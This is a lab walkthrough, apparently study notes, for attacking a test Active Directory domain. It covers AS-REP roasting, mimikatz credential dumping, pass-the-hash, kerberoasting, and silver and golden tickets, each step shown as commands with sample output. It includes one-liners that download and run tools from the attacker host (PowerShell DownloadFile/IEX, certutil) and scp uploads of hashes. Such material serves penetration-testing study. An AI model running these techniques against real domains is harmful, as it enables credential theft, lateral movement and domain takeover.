# Attacking Active Directory

## Lab Environment

|Server|IP Address|OS|Function|
|---|---|---|---|
|kali.vx|192.168.17.10|Kali Linux 2022.3|Attacking Machine|
|dc.lab.vx|192.168.17.11|Windows Server 2022|Domain Controller|
|svr.lab.vx|192.168.17.12|Windows Server 2022|Domain Member Server, SQL Server|
|client.lab.vx|192.168.17.13|Windows 11|Domain Member Workstation, SQL Server Management Studio|

## Nmap Scan

```console
┌──(root㉿kali)-[~]
└─$ nmap -p- -sV -Pn 192.168.17.11-13
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-25 12:29 +08
```

#### Domain Controller

```console
Nmap scan report for 192.168.17.11
Host is up (0.00090s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-10-25 04:32:29Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: lab.vx0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: lab.vx0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
57911/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
57912/tcp open  msrpc         Microsoft Windows RPC
57924/tcp open  msrpc         Microsoft Windows RPC
57929/tcp open  msrpc         Microsoft Windows RPC
57960/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

#### Domain Member Server, SQL Server

```console
Nmap scan report for 192.168.17.12
Host is up (0.0011s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49670/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

#### Domain Member Workstation

```console
Nmap scan report for 192.168.17.13
Host is up (0.0013s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ssl/ms-wbt-server?
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
49670/tcp open  msrpc              Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

#### Time Taken

```console
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 3 IP addresses (3 hosts up) scanned in 342.02 seconds
```

# 1. AS-REP Roasting

AS-REP is a quick way to scan for entry into the domain when you do not know much about the domain yet

## 1.1. The theory

AS-REP Roasting is a technique that allows retrieving password hashes for users that have Kerberos preauthentication disabled

![image](https://user-images.githubusercontent.com/90442032/206058102-6eb7dd07-d78e-4ab0-b83e-4c93f8a7ffb0.png)

When preauthentication is **enabled**:
- A user sends an Authentication Server Request (`AS-REQ`) message to the DC
- The timestamp on that message is encrypted with the hash of the user’s password
- If the DC can decrypt that timestamp using the user’s password hash on record, it sends back an Authentication Server Response (`AS-REP`) message that contains a session key and a Ticket Granting Ticket (`TGT`) issued by the Key Distribution Center (`KDC`), which is used for future access requests by the user

If preauthentication is **disabled**:
- A user can request authentication data for any user and the DC would return an `AS-REP` message
- The session key part of the `AS-REP` message is encrypted using the user’s password hash, which can be used to brute-force the user’s password offline

## 1.2. Use kerbrute to find users with preauthentication disabled

```console
┌──(root㉿kali)-[~]
└─# kerbrute -users /usr/share/seclists/Usernames/Names/names.txt -domain lab.vx -dc-ip 192.168.17.11
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Valid user => cindy
[*] Valid user => dave
[*] Valid user => john
[*] Valid user => luke [NOT PREAUTH]
[*] Valid user => mike [NOT PREAUTH]
[*] Valid user => paul
[*] Valid user => ruth
[*] Valid user => steve
[*] Valid user => svr
[*] No passwords were discovered :'(
```

## 1.3. Use GetNPUsers.py to get password hash

```console
┌──(root㉿kali)-[~]
└─# python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py lab.vx/luke -no-pass -dc-ip 192.168.17.11
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for luke
$krb5asrep$23$luke@LAB.VX:83a8d136c9ba393dd708c9aa7592627c$14923c61398475cc0472ed6f9d32058fd2cc40f303bbf4eb0fd7df2bffd0fd9dcb9471ed8dfa40e816f7dc6852b736a89c8ab0d1176f4d37b4c3359639df8d068f05305b51e7d0ed46902c5a7c038565d734a581600ac7619279f9f58c810766abf462b666f5e161f2e4f0a7d00dd4f35220f0e4c7803a291a02aec1f4206b066c6203d72d53b5d87a50d3ec446c9a03744f9662395fe402002859554873cfdccd06a55517072304a3939825068ac58be739c4732cae4efb95bd99fd29a21dfa15c53baff833f0003b56e48037404f6256413fed0c02623ba87b6c6a2d347129

┌──(root㉿kali)-[~]
└─# python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py lab.vx/mike -no-pass -dc-ip 192.168.17.11
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for mike
$krb5asrep$23$mike@LAB.VX:16b0315eceaf3c550a69927d62456d9d$821259e1e9980ad1d2fe42f2278c09ebec3aa95cfb361df26ea424d544a79a0f01ee594a13f486086976f469671319da5b60fd334ce103c87d3ac57082820063bad67799e3670e8774594d7a7138caa8892e0cfaec067c19aaf8b32be13f92d302ba0f3b1875a4b030002e447579d3950a9843012c53687ce1342d1a2da0de3dad94b54f56bcfc7d3e07a09b91d81ca94d80690f9db7e0921c20d223f4b6db66ad94b3aa5a89b392fedd8e69428ea27359f80b7c00df0c8075f7fa1543c9f27956e5d5950e14b4405d7c5aeec255d3df1ecabdc05e5a0a892c00cb2e415e8cf7
```

## 1.4. User hashcat to crack the hashes

```console
┌──(root㉿kali)-[~]
└─# time hashcat -m 18200 GetNPUsers.out /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting
⋮
$krb5asrep$23$mike@LAB.VX:…:P@ssw0rd
$krb5asrep$23$luke@LAB.VX:…:P@ssw0rd

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
⋮
Started: Wed Dec  7 07:54:16 2022
Stopped: Wed Dec  7 07:54:44 2022

real    0m28.048s
user    0m26.413s
sys     0m0.398s
```

# 2. Cached Credential Storage and Retrieval

**On Kali:** Prepare web server for `mimikatz` download

Prepare files to web server root

☝️ Apache2 is already running with DocumentRoot at `/var/www/html`

If Kali isn't setup as web server, use `python3 -m http.server 80 &> /dev/null &` to run a web server endpoint, the web server root will be the `pwd` where the command was run

```console
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe /var/www/html
```

**On Target:** Download and run `mimikatz`

Option 1: PowerShell

- Download: `(New-Object System.Net.WebClient).DownloadFile()`
- Run: `Start-Process`

```cmd
set SRC_URL=http://kali.vx/mimikatz.exe
set DST_PATH=%TEMP%\mimikatz.exe
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile($env:SRC_URL,$env:DST_PATH); Start-Process $env:DST_PATH
```

Option 2: certutil

```cmd
certutil.exe /urlcache /f /split http://kali.vx/mimikatz.exe %TEMP%\mimikatz.exe && %TEMP%\mimikatz.exe
```

**On Target:** mimikatz commands

- Ref: <https://tools.thehacker.recipes/mimikatz>

|Command|Function|
|---|---|
|`privilege::debug`|Requests the debug privilege `SeDebugPrivilege`; required to debug and adjust the memory of a process owned by another account|
|`token::elevate`|Impersonates a SYSTEM token (default) or domain admin token (using `/domainadmin`)|
|`lsadump::sam`|Dumps the local Security Account Manager (SAM) NT hashes; operate directly on the target system, or offline with registry hives backups (for SAM and SYSTEM)|
|`lsadump::lsa /patch`|Extracts hashes from memory by asking the LSA server; `/patch` or `/inject` takes place on the fly|
|`sekurlsa::logonpasswords`|Lists all available provider credentials; usually shows recently logged on user and computer credentials|

- ☝️ **Note**: mimikatz needs to run from an elevated shell; running mimikatz from a non-elevated shell will not work:

```cmd
mimikatz # privilege::debug
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

mimikatz # lsadump::sam
Domain : CLIENT
SysKey : 732c3b24f5f9c476753d4d1bc72961d7
ERROR kull_m_registry_OpenAndQueryWithAlloc ; kull_m_registry_RegOpenKeyEx KO
ERROR kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx SAM Accounts (0x00000005)

mimikatz # lsadump::lsa /patch
ERROR kuhl_m_lsadump_lsa_getHandle ; OpenProcess (0x00000005)

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
```

## 2.1. Successful `lsadump::sam` example

```cmd
mimikatz # lsadump::sam
Domain : CLIENT
SysKey : 732c3b24f5f9c476753d4d1bc72961d7
Local SID : S-1-5-21-1540030335-1244868743-683777651

SAMKey : 3e3e9d70bd634ed43edbe5548d50e40e

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: e19ccf75ee54e06b06a5907af13cef42

Supplemental Credentials:
⋮

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 5a2b1b78290d381def497905d467fcff

Supplemental Credentials:
⋮

RID  : 000003eb (1003)
User : localadmin
  Hash NTLM: e19ccf75ee54e06b06a5907af13cef42
    lm  - 0: 16c96a30f045654ca0f5277d816dc3fc
    ntlm- 0: e19ccf75ee54e06b06a5907af13cef42

Supplemental Credentials:
⋮
```

## 2.2. Successful `lsadump::lsa /patch` example

```cmd
mimikatz # lsadump::lsa /patch
Domain : CLIENT / S-1-5-21-1540030335-1244868743-683777651

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : e19ccf75ee54e06b06a5907af13cef42

RID  : 000001f7 (503)
User : DefaultAccount
LM   :
NTLM :

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000003eb (1003)
User : localadmin
LM   :
NTLM : e19ccf75ee54e06b06a5907af13cef42

RID  : 000001f8 (504)
User : WDAGUtilityAccount
LM   :
NTLM : 5a2b1b78290d381def497905d467fcff
```

## 2.3. Successful `sekurlsa::logonpasswords` example

```cmd
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 7831562 (00000000:0077800a)
Session           : Interactive from 0
User Name         : mike
Domain            : LAB
Logon Server      : DC
Logon Time        : 4/10/2022 9:13:04 PM
SID               : S-1-5-21-1470288461-3401294743-676794760-1105
        msv :
         [00000003] Primary
         * Username : mike
         * Domain   : LAB
         * NTLM     : e19ccf75ee54e06b06a5907af13cef42
         * SHA1     : 9131834cf4378828626b1beccaa5dea2c46f9b63
         * DPAPI    : 0c6f0ff405f11531e7cd38a3f89ad32f
        ⋮

Authentication Id : 0 ; 3508055 (00000000:00358757)
Session           : Interactive from 1
User Name         : domainadmin
Domain            : LAB
Logon Server      : DC
Logon Time        : 4/10/2022 8:48:56 PM
SID               : S-1-5-21-1470288461-3401294743-676794760-1104
        msv :
         [00000003] Primary
         * Username : domainadmin
         * Domain   : LAB
         * NTLM     : e19ccf75ee54e06b06a5907af13cef42
         * SHA1     : 9131834cf4378828626b1beccaa5dea2c46f9b63
         * DPAPI    : 66880edfa688d3f7b7ab4a215cee53a7
        ⋮

••• OUTPUT TRUNCATED •••
```

# 3. Pass the Hash

☝️ **Note**: LM hashes are not used from Windows 10 onwards, a string of `32 zeros` can used to fill the LM hash portion of the pth-winexe command

## 3.1. pth-winexe
- Domain account

```console
┌──(root㉿kali)-[~]
└─$ pth-winexe -U LAB/domainadmin%00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 //192.168.17.151 cmd
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
lab\domainadmin

C:\Windows\system32>hostname
hostname
SVR
```

- Local account

```console
┌──(root㉿kali)-[~]
└─$ pth-winexe -U administrator%00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 //192.168.17.151 cmd
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
svr\administrator

C:\Windows\system32>hostname
hostname
SVR
```

## 3.2. mimikatz - sekurlsa::pth

### 3.2.1. Domain account

- On mimikatz: run `privilege::debug` followed by `sekurlsa::pth`
- The `sekurlsa::pth` will spawn a new cmd window

```cmd
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /user:domainadmin /domain:lab.vx /ntlm:e19ccf75ee54e06b06a5907af13cef42
user    : domainadmin
domain  : lab.vx
program : cmd.exe
impers. : no
NTLM    : e19ccf75ee54e06b06a5907af13cef42
⋮
```

- Connect to the target machine in the new cmd window

```cmd
C:\Windows\system32>whoami
lab\mike

C:\Windows\system32>hostname
CLIENT

C:\Windows\system32>psexec \\dc cmd.exe

PsExec v2.34 - Execute processes remotely
Copyright (C) 2001-2021 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
lab\domainadmin

C:\Windows\system32>hostname
DC
```

### 3.2.2. Local account

- Using `sekurlsa::pth` for local accounts is similar as domain accounts; just use `*` or `workgroup` for the `/domain` option

```cmd
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /user:administrator /domain:* /ntlm:e19ccf75ee54e06b06a5907af13cef42
user    : administrator
domain  : *
program : cmd.exe
impers. : no
NTLM    : e19ccf75ee54e06b06a5907af13cef42
⋮
```

- Connect to the target machine in the new cmd window
- ☝️ **Note**: `sekurlsa::pth` for local accounts must use the built-in `administrator` account, because only PsExec uses the `ADMIN$` to run the new cmd

```cmd
C:\Windows\system32>whoami
lab\mike

C:\Windows\system32>hostname
CLIENT

C:\Windows\system32>psexec \\svr cmd.exe

PsExec v2.34 - Execute processes remotely
Copyright (C) 2001-2021 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
svr\administrator

C:\Windows\system32>hostname
SVR
```

# 4. Service Account Attack

## 4.1. Discover SPNs

```cmd
C:\Users\mike>setspn -Q */*
Checking domain DC=lab,DC=vx
CN=krbtgt,CN=Users,DC=lab,DC=vx
        ⋮
CN=SVR,CN=Computers,DC=lab,DC=vx
        ⋮
CN=CLIENT,CN=Computers,DC=lab,DC=vx
        ⋮
CN=DC,OU=Domain Controllers,DC=lab,DC=vx
        ⋮
CN=MSSQL Service Account,OU=OSCP Lab,DC=lab,DC=vx
        MSSQLSvc/SVR.lab.vx:1433
        MSSQLSvc/SVR.lab.vx

Existing SPN found!
```

## 4.2. Kerberoasting

### 4.2.1. Option 1 - Extracting service account hash with mimikatz + kerberoast package

**On Target:** Request tickets from PowerShell

```cmd
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList MSSQLSvc/SVR.lab.vx:1433
```

**Sample Results:**

```cmd
PS C:\Users\mike> klist

Current LogonId is 0:0xa48995

Cached Tickets: (3)

⋮

#2>     Client: mike @ LAB.VX
        Server: MSSQLSvc/SVR.lab.vx:1433 @ LAB.VX
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 4/16/2022 10:00:51 (local)
        End Time:   4/16/2022 19:53:54 (local)
        Renew Time: 4/23/2022 9:53:54 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called: DC.lab.vx

⋮
```

**On Target:** Dump tickets using mimikatz

- ☝️ **Note**: to retrieve user kerberos tickets, do **NOT** use `privilege::debug` + `token::elevate` in mimikatz; doing so impersonates the `SYSTEM` token and ends up retrieving machine kerberos tickets instead

```console
mimikatz # kerberos::list /export

⋮

[00000001] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 16/4/2022 10:00:51 am ; 16/4/2022 7:53:54 pm ; 23/4/2022 9:53:54 am
   Server Name       : MSSQLSvc/SVR.lab.vx:1433 @ LAB.VX
   Client Name       : mike @ LAB.VX
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
   * Saved to file     : 2-40a10000-mike@MSSQLSvc~SVR.lab.vx~1433-LAB.VX.kirbi

⋮
```

- ☝️ **Note**: In event of `ERROR kuhl_m_kerberos_list ; kull_m_file_writeData (0x00000005)` error, check that the user has permissions to write to the present working directory
- e.g. Attempting to run `C:\Windows\System32\cmd.exe` as a non-admin user works, but attempting to use mimikatz to save tickets to `C:\Windows\System32\` will result in write errors

**On Target:** Upload the ticket to Kali

```cmd
scp <ticket> kali@kali.vx:/home/kali/
```

#### Use the Kerberoast package to extract the hash from the service ticket

**On Kali:** Install kerberoast module

- Ref: <https://github.com/nidem/kerberoast>

```console
sudo apt -y install kerberoast
```

**On Kali:** Extract service account hash from the ticket exported by mimikatz

```console
┌──(root㉿kali)-[~]
└─$ python3 /usr/share/kerberoast/kirbi2john.py 1-40a10000-mike@MSSQLSvc~SVR.lab.vx~1433-LAB.VX.kirbi > tgs.hash
tickets written: 1
```

### 4.2.2. Option 2 - Extracting service account hash directly with Invoke-Kerberoast script from powershell-empire

#### Dump password hash

**On Kali:** Setup web server to host `Invoke-Kerberoast.ps1`

```console
cp /usr/share/powershell-empire/empire/server/data/module_source/credentials/Invoke-Kerberoast.ps1 .
sudo python3 -m http.server 80 &> /dev/null &
```

**On Target:** Download and run `Invoke-Kerberoast`

- Download: `(New-Object System.Net.WebClient).DownloadFile()`
- Run: `Invoke-Kerberoast`

```cmd
powershell.exe -NoProfile -ExecutionPolicy Bypass "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://kali.vx/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII tgs.hash"
```

**On Target:** Upload the hash to Kali

```cmd
scp tgs.hash kali@kali.vx:/home/kali/
```

## 4.3. Cracking service account hash using hashcat

#### Unpack existing `rockyou.txt` (❗14 million records❗)

```console
┌──(root㉿kali)-[~]
└─$ gzip -d /usr/share/wordlists/rockyou.txt.gz
```

#### Use the hashcat to crack the service ticket

❗USE HASHCAT, IT'S HELLA FASTER❗

It doesn't matter that `rockyou.txt` has 14 million records, the time taken by hashcat is about the same
- Hashcat takes about **27s** to build a dictionary cache of the wordlist
- If there is a cache hit, cracking the password takes only about **2.7s**

#### Crack the hash

```console
┌──(root㉿kali)-[~]
└─$ time hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting
⋮
$krb5tgs$23$*MSSQLSVC$lab.vx$MSSQLSvc/SVR.lab.vx:1433*…:P@ssw0rd

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
⋮
Started: Wed Oct 26 20:51:46 2022
Stopped: Wed Oct 26 20:52:13 2022

real    0m27.158s
user    0m25.597s
sys     0m0.333s
```

## 4.4. Cracking .kirbi ticket using tgsrepcrack.py (not recommended)

- It is possible to crack the .kirbi ticket exported from mimikatz directing using the `tgsrepcrack.py` script, but it is extremely slow compared to hashcat
- Time taken for `tgsrepcrack.py`:

| Number of passwords | Time taken |
|---|---|
| 10,000 | 0m4.974s |
| 100,000 | 0m47.707s |
| 1,000,000 | 8m14.453s |

- Using the full `rockyou.txt`, which as 14 million records, is near impossible using this method

#### Crack the ticket

```console
┌──(root㉿kali)-[~]
└─$ time python3 /usr/share/kerberoast/tgsrepcrack.py rockyou.100k 1-40a10000-mike@MSSQLSvc~SVR.lab.vx~1433-LAB.VX.kirbi


    USE HASHCAT, IT'S HELLA FASTER!!


Cracking 1 tickets...
found password for ticket 0: P@ssw0rd  File: 1-40a10000-mike@MSSQLSvc~SVR.lab.vx~1433-LAB.VX.kirbi
Successfully cracked all tickets

real    0m47.861s
user    0m47.828s
sys     0m0.016s
```

## 4.5. Silver Ticket

### 4.5.1. Retrieve domain's numeric identifier

Security Identifier or SID format: `S-R-I-S`
- `S` - A literal `S` to identify the string as a SID
- `R` - Revision level, usually set to `1`
- `I` - Identifier-authority value, often `5` within AD
- `S` - Subauthority values:
  - Domain's numeric identifier, e.g. `21-1470288461-3401294743-676794760`
  - Relative identifier or RID representing the specific object in the domain, e.g. `1105`

```cmd
C:\Users\mike>whoami /user

USER INFORMATION
----------------

User Name SID
========= =============================================
lab\mike  S-1-5-21-1470288461-3401294743-676794760-1105
```

### 4.5.2. Generate hash value for service account password

```cmd
mimikatz # kerberos::hash /password:P@ssw0rd
        * rc4_hmac_nt       e19ccf75ee54e06b06a5907af13cef42
        * aes128_hmac       f67365e0a00838aff75e6ca33f3c2be2
        * aes256_hmac       9e0de99003a18068f2e2186cd1162e9b6398f7b873854ccf16040ce16aa06d26
        * des_cbc_md5       76fdfece25e3da54
```

### 4.5.3. Purge existing kerberos tickets

- ☝️ **Note**: it is important to run `kerberos::purge` even if `klist` show zero cached tickets
```cmd
mimikatz # kerberos::purge
Ticket(s) purge for current session is OK
```

### 4.5.4. Generate KRB_TGS ticket

- ☝️ **Note**: The service identifies the user using the SID, the user name can be anything like `nonexistentuser`

```cmd
mimikatz # kerberos::golden /user:nonexistentuser /domain:LAB.VX /sid:S-1-5-21-1470288461-3401294743-676794760 /id:1105 /target:svr.lab.vx:1433 /service:MSSQLSvc /rc4:e19ccf75ee54e06b06a5907af13cef42 /ptt
User      : nonexistentuser
Domain    : LAB.VX (LAB)
SID       : S-1-5-21-1470288461-3401294743-676794760
User Id   : 1105
Groups Id : *513 512 520 518 519
ServiceKey: e19ccf75ee54e06b06a5907af13cef42 - rc4_hmac_nt
Service   : MSSQLSvc
Target    : svr.lab.vx:1433
Lifetime  : 18/4/2022 9:15:16 am ; 15/4/2032 9:15:16 am ; 15/4/2032 9:15:16 am
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'nonexistentuser @ LAB.VX' successfully submitted for current session
```

### 4.5.5. Verify ticket

```cmd
C:\Users\dummy>klist

Current LogonId is 0:0x3441a5

Cached Tickets: (1)

#0>     Client: nonexistentuser @ LAB.VX
        Server: MSSQLSvc/svr.lab.vx:1433 @ LAB.VX
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 4/18/2022 9:15:16 (local)
        End Time:   4/15/2032 9:15:16 (local)
        Renew Time: 4/15/2032 9:15:16 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```

### 4.5.6. Attempt login to service

```cmd
C:\Users\dummy>"C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\SQLCMD.EXE" -S svr.lab.vx
1> SELECT SYSTEM_USER;
2> GO

--------------------------------------------------------------------------------------------------------------------------------
LAB\nonexistentuser

(1 rows affected)
```

# 5. Golden Ticket

## 5.1. Dump password hashes on domain controller

- Requires `Domain Admins` rights
- Information of interest: domain SID and `krbtgt` password hash

```cmd
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::lsa /patch
Domain : LAB / S-1-5-21-1470288461-3401294743-676794760

⋮

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 3ac4cccaca955597db0d11a7ffa50025

⋮
```

## 5.2. Create golden ticket using information retrieved from domain controller

- This can be performed on any domain member machine, without administrator rights
- ☝️ **Note**: it is important to run `kerberos::purge` even if `klist` show zero cached tickets
- The `misc::cmd` command opens a command prompt session with the golden ticket injected to that session

```cmd
mimikatz # kerberos::purge
Ticket(s) purge for current session is OK

mimikatz # kerberos::golden /user:nonexistentuser /domain:lab.vx /sid:S-1-5-21-1470288461-3401294743-676794760 /krbtgt:3ac4cccaca955597db0d11a7ffa50025 /ptt
User      : nonexistentuser
Domain    : lab.vx (LAB)
SID       : S-1-5-21-1470288461-3401294743-676794760
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 3ac4cccaca955597db0d11a7ffa50025 - rc4_hmac_nt
Lifetime  : 23/4/2022 4:05:49 pm ; 20/4/2032 4:05:49 pm ; 20/4/2032 4:05:49 pm
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'nonexistentuser @ lab.vx' successfully submitted for current session

mimikatz # misc::cmd
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF6FF396438
```

## 5.3. Use the golden ticket to laterally move to **any** domain machine

- Verify golden ticket in session

```cmd
C:\Users\john>hostname
CLIENT

C:\Users\john>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.17.13
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.17.1

C:\Users\john>klist

Current LogonId is 0:0x50b951

Cached Tickets: (1)

#0>     Client: nonexistentuser @ lab.vx
        Server: krbtgt/lab.vx @ lab.vx
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 4/23/2022 15:47:53 (local)
        End Time:   4/20/2032 15:47:53 (local)
        Renew Time: 4/20/2032 15:47:53 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

- Attempt to connect to domain member machine

```cmd
C:\Users\john>PsExec.exe \\SVR.lab.vx cmd.exe

PsExec v2.34 - Execute processes remotely
Copyright (C) 2001-2021 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
lab\nonexistentuser

C:\Windows\system32>hostname
SVR

C:\Windows\system32>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.17.12
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.17.1

Tunnel adapter isatap.{122DB809-79C7-4A57-9A51-76A6C8B0B97B}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
```
